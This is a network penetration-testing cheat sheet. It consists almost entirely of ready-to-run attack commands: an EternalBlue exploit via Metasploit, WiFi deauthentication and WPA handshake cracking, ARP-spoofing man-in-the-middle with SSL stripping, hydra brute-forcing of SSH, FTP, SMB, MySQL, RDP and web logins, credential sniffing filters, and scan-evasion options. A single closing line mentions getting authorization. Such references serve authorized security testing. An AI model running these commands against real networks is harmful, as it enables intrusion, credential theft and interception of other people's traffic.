# Network Security Quick Reference Cheat Sheet

## Common Attack Scenarios

### Scenario 1: Internal Network Penetration Test
```bash
# 1. Network Discovery
nmap -sn 192.168.1.0/24                       # Find live hosts
arp-scan -l                                   # ARP scan

# 2. Port Scanning
nmap -sS -p- --min-rate 10000 192.168.1.100   # Fast full scan
nmap -sV -O -p 1-1000 192.168.1.100          # Service/OS detection

# 3. Service Enumeration
nmap -p 445 --script=smb-enum-shares 192.168.1.100
nmap -p 80,443 --script=http-enum 192.168.1.100

# 4. Vulnerability Scanning
nmap --script vuln 192.168.1.100

# 5. Exploitation (if authorized)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.100; run"
```

### Scenario 2: WiFi Security Assessment
```bash
# 1. Monitor Mode
airmon-ng check kill
airmon-ng start wlan0

# 2. Network Discovery
airodump-ng wlan0mon

# 3. Target Capture
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# 4. Deauth Clients (capture handshake)
aireplay-ng --deauth 10 -a XX:XX:XX:XX:XX:XX wlan0mon

# 5. Crack WPA
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Scenario 3: Man-in-the-Middle Attack
```bash
# 1. Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# 2. ARP Poisoning
bettercap -iface eth0
# In bettercap console:
net.probe on
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on

# 3. Capture Traffic
tcpdump -i eth0 -w mitm.pcap

# 4. SSL Stripping (if needed)
set http.proxy.sslstrip true
http.proxy on
```

---

## Port-by-Port Quick Reference

### Port 21 (FTP)
```bash
nmap -p 21 --script=ftp-anon,ftp-bounce 192.168.1.100
ftp 192.168.1.100                             # Try anonymous:anonymous
hydra -L users.txt -P pass.txt ftp://192.168.1.100
```

### Port 22 (SSH)
```bash
nmap -p 22 --script=ssh-auth-methods 192.168.1.100
hydra -l root -P pass.txt ssh://192.168.1.100
ssh-keyscan 192.168.1.100                     # Get SSH keys
```

### Port 25 (SMTP)
```bash
nmap -p 25 --script=smtp-enum-users,smtp-open-relay 192.168.1.100
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100
telnet 192.168.1.100 25                       # Manual SMTP commands
```

### Port 53 (DNS)
```bash
dig @192.168.1.100 target.com ANY
dig @192.168.1.100 target.com axfr            # Zone transfer
nmap -p 53 --script=dns-zone-transfer 192.168.1.100
fierce --domain target.com                    # DNS enumeration
```

### Port 80/443 (HTTP/HTTPS)
```bash
nmap -p 80,443 --script=http-enum 192.168.1.100
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
curl -I http://192.168.1.100                  # Headers
nikto -h http://192.168.1.100                 # Web scanner
```

### Port 139/445 (SMB)
```bash
nmap -p 445 --script=smb-enum-shares,smb-os-discovery 192.168.1.100
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100 -N
crackmapexec smb 192.168.1.100
```

### Port 3306 (MySQL)
```bash
nmap -p 3306 --script=mysql-info,mysql-empty-password 192.168.1.100
mysql -h 192.168.1.100 -u root -p
hydra -L users.txt -P pass.txt mysql://192.168.1.100
```

### Port 3389 (RDP)
```bash
nmap -p 3389 --script=rdp-enum-encryption 192.168.1.100
rdesktop 192.168.1.100
xfreerdp /u:admin /p:password /v:192.168.1.100
hydra -l admin -P pass.txt rdp://192.168.1.100
```

---

## One-Liner Payloads

### Network Reconnaissance
```bash
# Quick network sweep
for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "64 bytes" & done

# Find live hosts with nmap
nmap -sn 192.168.1.0/24 -oG - | grep "Up" | cut -d' ' -f2

# Quick port scan
nc -zv 192.168.1.100 1-1000 2>&1 | grep succeeded
```

### Password Attacks
```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100 -t 4

# Multiple services
for service in ssh ftp mysql; do hydra -L users.txt -P pass.txt $service://192.168.1.100; done
```

### Traffic Capture
```bash
# Capture credentials
tcpdump -i eth0 -A 'tcp port 21 or tcp port 23 or tcp port 110' -w creds.pcap

# Capture HTTP traffic
tshark -i eth0 -Y "http.request.method == POST" -T fields -e http.request.uri -e http.file_data
```

### DNS Operations
```bash
# Reverse DNS sweep
for i in {1..254}; do host 192.168.1.$i | grep "domain name pointer"; done

# DNS enumeration
for sub in www mail ftp vpn; do host $sub.target.com; done
```

---

## Evasion Techniques Quick Reference

### Nmap Evasion
```bash
# Fragmentation + Decoys + Timing
nmap -f -D RND:10 -T2 --source-port 53 192.168.1.100

# Ultra-stealth scan
nmap -sS -T0 -f --data-length 200 -D RND:5 192.168.1.100

# Firewall bypass
nmap -sA -T4 -p- 192.168.1.100
```

### Proxychains
```bash
# Edit /etc/proxychains.conf, then:
proxychains nmap -sT 192.168.1.100
proxychains curl http://192.168.1.100
proxychains ssh user@192.168.1.100
```

---

## Traffic Analysis Filters

### Wireshark Display Filters
```
http.request                                  # HTTP requests
http.request.method == "POST"                 # POST requests
ftp.request.command == "PASS"                 # FTP passwords
smtp.auth.password                            # SMTP passwords
dns.qry.name contains "target"                # DNS queries
tcp.flags.syn == 1 && tcp.flags.ack == 0      # SYN packets
```

### tcpdump Filters
```bash
tcpdump -i eth0 'tcp port 80'                 # HTTP traffic
tcpdump -i eth0 'udp port 53'                 # DNS traffic
tcpdump -i eth0 'icmp'                        # ICMP traffic
tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'  # SYN packets
tcpdump -i eth0 'src host 192.168.1.100'      # From specific host
```

---

## Credential Attacks

### Hydra Quick Reference
```bash
# SSH
hydra -l admin -P pass.txt ssh://192.168.1.100

# FTP
hydra -L users.txt -P pass.txt ftp://192.168.1.100

# HTTP POST
hydra -L users.txt -P pass.txt http-post-form://192.168.1.100/login:"user=^USER^&pass=^PASS^:F=incorrect"

# SMB
hydra -L users.txt -P pass.txt smb://192.168.1.100

# MySQL
hydra -l root -P pass.txt mysql://192.168.1.100
```

---

## Automation Scripts

### Bash: Quick Network Sweep
```bash
#!/bin/bash
for ip in 192.168.1.{1..254}; do
    ping -c 1 -W 1 $ip &>/dev/null && echo "$ip is up"
done
```

### Python: Port Scanner
```python
import socket
for port in range(1, 1025):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex(('192.168.1.100', port))
    if result == 0:
        print(f"Port {port} is open")
    sock.close()
```

---

## Common Command Combinations

### Full Network Assessment
```bash
# Discovery → Scanning → Enumeration → Exploitation
nmap -sn 192.168.1.0/24 -oG - | grep Up | cut -d' ' -f2 > live_hosts.txt
nmap -sS -sV -p- -iL live_hosts.txt -oA full_scan
nmap --script vuln -iL live_hosts.txt -oA vuln_scan
```

### WiFi Assessment
```bash
# Monitor → Scan → Attack → Crack
airmon-ng start wlan0 && airodump-ng wlan0mon -w scan --output-format pcap
# Wait for handshake, then:
aircrack-ng -w wordlist.txt scan-01.cap
```

---

## Emergency Commands

### Stop All Attacks
```bash
killall aircrack-ng aireplay-ng airodump-ng
killall bettercap ettercap
echo 0 > /proc/sys/net/ipv4/ip_forward
```

### Restore Network
```bash
airmon-ng stop wlan0mon
service network-manager restart
ifconfig eth0 down && ifconfig eth0 up
```

---

**Remember**: Always get written authorization before performing any security testing!
